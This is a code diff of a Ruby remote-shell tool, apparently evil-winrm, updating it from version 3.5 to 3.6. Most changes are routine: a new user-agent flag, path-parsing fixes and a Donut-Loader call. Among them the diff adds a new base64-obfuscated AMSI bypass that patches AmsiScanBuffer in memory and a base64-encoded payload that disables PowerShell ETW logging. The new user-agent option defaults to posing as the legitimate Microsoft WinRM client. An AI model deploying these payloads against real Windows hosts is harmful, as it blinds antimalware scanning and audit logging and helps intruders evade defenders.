@@ -17,11 +17,12 @@ require 'io/console'
 require 'time'
 require 'fileutils'
 require 'logger'
+require 'shellwords'
 
 # Constants
 
 # Version
-VERSION = '3.5'
+VERSION = '3.6'
 
 # Msg types
 TYPE_INFO = 0
@@ -56,6 +57,7 @@ $password = ''
 $url = 'wsman'
 $default_service = 'HTTP'
 $full_logging_path = "#{Dir.home}/evil-winrm-logs"
+$user_agent = "Microsoft WinRM Client"
 
 # Redefine download method from winrm-fs
 module WinRM
@@ -64,7 +66,7 @@ module WinRM
       def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
         @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
         index = 0
-        return download_dir(remote_path, local_path, chunk_size, false) if remote_path.match?(/(\*\.|\*\*|\.\*|\*)/)
+        return download_dir(remote_path, local_path, chunk_size, false) if remote_path.match?(/(\*\.?|\*\*|\.?\*|\*)/)
         output = _output_from_file(remote_path, chunk_size, index)
         return download_dir(remote_path, local_path, chunk_size, true) if output.exitcode == 2
         return false if output.exitcode >= 1
@@ -89,7 +91,7 @@ module WinRM
       end
 
       def download_dir(remote_path, local_path, chunk_size, first)
-        index_exp = remote_path.index(/(\*\.|\*\*|\.\*|\*)/) || 0
+        index_exp = remote_path.index(/(\*\.?|\*\*|\.?\*|\*)/) || 0
         remote_file_path = remote_path
 
         if index_exp > 0
@@ -155,12 +157,15 @@ class EvilWinRM
 
   # Arguments
   def arguments
-    options = { port: $port, url: $url, service: $service }
+    options = { port: $port, url: $url, service: $service, user_agent: $user_agent }
     optparse = OptionParser.new do |opts|
-      opts.banner = 'Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]'
+      opts.banner = 'Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]'
       opts.on('-S', '--ssl', 'Enable ssl') do |_val|
         $ssl = true
         options[:port] = '5986'
+      end
+      opts.on('-a', '--user-agent USERAGENT', 'Specify connection user-agent (default Microsoft WinRM Client)') do |val|
+        options[:user_agent] = val
       end
       opts.on('-c', '--pub-key PUBLIC_KEY_PATH', 'Local path to public key certificate') do |val|
         options[:pub_key] = val
@@ -253,6 +258,7 @@ class EvilWinRM
     $priv_key = options[:priv_key]
     $realm = options[:realm]
     $service = options[:service]
+    $user_agent = options[:user_agent]
     unless $log.nil?
 
       FileUtils.mkdir_p $full_logging_path
@@ -289,7 +295,8 @@ class EvilWinRM
                   no_ssl_peer_verification: true,
                   transport: :ssl,
                   client_cert: $pub_key,
-                  client_key: $priv_key
+                  client_key: $priv_key,
+                  user_agent: $user_agent
                 )
               else
                 WinRM::Connection.new(
@@ -297,7 +304,8 @@ class EvilWinRM
                   user: $user,
                   password: $password,
                   no_ssl_peer_verification: true,
-                  transport: :ssl
+                  transport: :ssl,
+                  user_agent: $user_agent
                 )
               end
 
@@ -308,14 +316,16 @@ class EvilWinRM
         password: '',
         transport: :kerberos,
         realm: $realm,
-        service: $service
+        service: $service,
+        user_agent: $user_agent
       )
     else
       $conn = WinRM::Connection.new(
         endpoint: "http://#{$host}:#{$port}/#{$url}",
         user: $user,
         password: $password,
-        no_ssl_peer_verification: true
+        no_ssl_peer_verification: true,
+        user_agent: $user_agent
       )
     end
   end
@@ -379,10 +389,10 @@ class EvilWinRM
     priv_key = priv_key.to_s
     if $ssl
       unless pub_key.empty? && priv_key.empty? then
-        unless [pub_key, priv_key].all? {|f| File.exists?(f) } then
-          print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exists?(pub_key)
+        unless [pub_key, priv_key].all? {|f| File.exist?(f) } then
+          print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exist?(pub_key)
 
-          print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exists?(priv_key)
+          print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exist?(priv_key)
 
           custom_exit(1)
         end
@@ -678,6 +688,7 @@ class EvilWinRM
                 dest = ""
                 source = ""
                 paths = get_paths_from_command(command, pwd)
+
                 if paths.length == 2
                   dest = paths.pop
                   source = paths.pop
@@ -759,6 +770,8 @@ class EvilWinRM
                     load_executable = File.binread(load_executable)
                     load_executable = Base64.strict_encode64(load_executable)
                     output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
+                else
+                    output = shell.run("Donut-Loader")
                 end
                 print(output.output)
                 $logger&.info(output.output)
@@ -908,7 +921,7 @@ class EvilWinRM
   end
 
   def get_Bypass_4MSI
-    bypass_template = 'JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIGNvZGUgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBydW9xeHAsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0KIkAKQWRkLVR5cGUgJGNvZGUKJGZqdGZxd24gPSBbY29kZV06OkxvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpCiNqdW1wCiRqeXV5amcgPSBbY29kZV06OkdldFByb2NBZGRyZXNzKCRmanRmcXduLCAiIiskdmFyMSsiIikKJHAgPSAwCiNqdW1wCiRudWxsID0gW2NvZGVdOjpWaXJ0dWFsUHJvdGVjdCgkanl1eWpnLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApCiRmbnh5ID0gIjB4QjgiCiRmbXh5ID0gIjB4NTciCiRld2FxID0gIjB4MDAiCiR3ZnRjID0gIjB4MDciCiRuZHVnID0gIjB4ODAiCiRobXp4ID0gIjB4QzMiCiNqdW1wCiRsbGZhbSA9IFtCeXRlW11dICgkZm54eSwkZm14eSwkZXdhcSwkd2Z0YywrJG5kdWcsKyRobXp4KQokbnVsbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGxsZmFtLCAwLCAkanl1eWpnLCA2KSA='
+    bypass_template = 'ZnVuY3Rpb24gTG9va3VwRnVuYyB7CiAgICBQYXJhbSAoJG1vZHVsZU5hbWUsICRmdW5jdGlvbk5hbWUpCiAgICAkYXNzZW0gPSAoW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uCiAgICAgRXF1YWxzKCdTeXN0ZW0uZGxsJykKICAgICB9KS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAkdG1wPUAoKQogICAgJGFzc2VtLkdldE1ldGhvZHMoKSB8IEZvckVhY2gtT2JqZWN0IHtJZigkXy5OYW1lIC1saWtlICJHZSpQKm9jKmRkcmVzcyIpIHskdG1wKz0kX319CiAgICByZXR1cm4gJHRtcFswXS5JbnZva2UoJG51bGwsIEAoKCRhc3NlbS5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpKS5JbnZva2UoJG51bGwsCkAoJG1vZHVsZU5hbWUpKSwgJGZ1bmN0aW9uTmFtZSkpCn0KI2p1bXAKCmZ1bmN0aW9uIGdldERlbGVnYXRlVHlwZSB7CiAgICBQYXJhbSAoCiAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1R5cGVbXV0KICAgICAkZnVuYywgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJGRlbFR5cGUgPSBbVm9pZF0KICAgICkKICAgICR0eXBlID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uCiAgICBEZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwKW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS4KICAgIERlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS4KICAgIERlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLAogICAgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCgogICR0eXBlLgogICAgRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywKW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkZnVuYykuCiAgICAgU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCgogICR0eXBlLgogICAgRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkZGVsVHlwZSwKJGZ1bmMpLiBTZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgIHJldHVybiAkdHlwZS5DcmVhdGVUeXBlKCkKfQojanVtcAoKJGE9IkEiCiRiPSJtc2lTIgokYz0iY2FuQiIKJGQ9InVmZmVyIgojanVtcApbSW50UHRyXSRmdW5jQWRkciA9IExvb2t1cEZ1bmMgYW1zaS5kbGwgKCRhKyRiKyRjKyRkKQojanVtcAokb2xkUHJvdGVjdGlvbkJ1ZmZlciA9IDAKI2p1bXAKJHZwPVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChMb29rdXBGdW5jIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdCksIChnZXREZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKSkKI2p1bXAKJGEgPSAkdnAuSW52b2tlKCRmdW5jQWRkciwgMywgMHg0MCwgW3JlZl0kb2xkUHJvdGVjdGlvbkJ1ZmZlcikKI2p1bXAKJGJ1ZiA9IFtCeXRlW11dICgweGI4LDB4MzQsMHgxMiwweDA3LDB4ODAsMHg2NiwweGI4LDB4MzIsMHgwMCwweGIwLDB4NTcsMHhjMykKI2p1bXAKJGEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRidWYsIDAsICRmdW5jQWRkciwgMTIpCiNqdW1wClJlbW92ZS1JdGVtIEZ1bmN0aW9uOmdldERlbGVnYXRlVHlwZQojanVtcApSZW1vdmUtSXRlbSBGdW5jdGlvbjpMb29rdXBGdW5jCgo='
     dec_template = Base64.decode64(bypass_template)
     result = dec_template.gsub('$var1', generate_random_type_string)
     @bypass_amsi_words_random_case.each { |w| result.gsub!(w.to_s, random_case(w)) }
@@ -927,6 +940,12 @@ class EvilWinRM
     output = shell.run(bypass)
     if output.output.empty?
       print_message('[+] Success!', TYPE_SUCCESS, false)
+      print_message('Patching ETW, please be patient ..', TYPE_INFO, true)
+      patch_etw = Base64.decode64("W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCdTeXN0ZW0uQ29yZScpLkdldFR5cGUoJ1N5c3RlbS5EaWFnbm9zdGljcy5FdmVudGluZy5FdmVudFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uVHJhY2luZy5QU0V0d0xvZ1Byb3ZpZGVyJykuR2V0RmllbGQoJ2V0d1Byb3ZpZGVyJywnTm9uUHVibGljLFN0YXRpYycpLkdldFZhbHVlKCksMCkK")
+      output = shell.run(patch_etw)
+      print_message('[+] Success!', TYPE_SUCCESS, false)
+      output = shell.run("Remove-Item Function:getDelegateType")
+      output = shell.run ("Remove-Item Function:LookupFunc")
     else
       puts(output.output)
     end
@@ -939,9 +958,8 @@ class EvilWinRM
   end
 
   def get_paths_from_command(command, pwd)
-    parts = command.split
+    parts = Shellwords.shellsplit(command)
     parts.delete_at(0)
-    parts.each { |p| p.gsub!('"', '') }
     return parts
   end
 
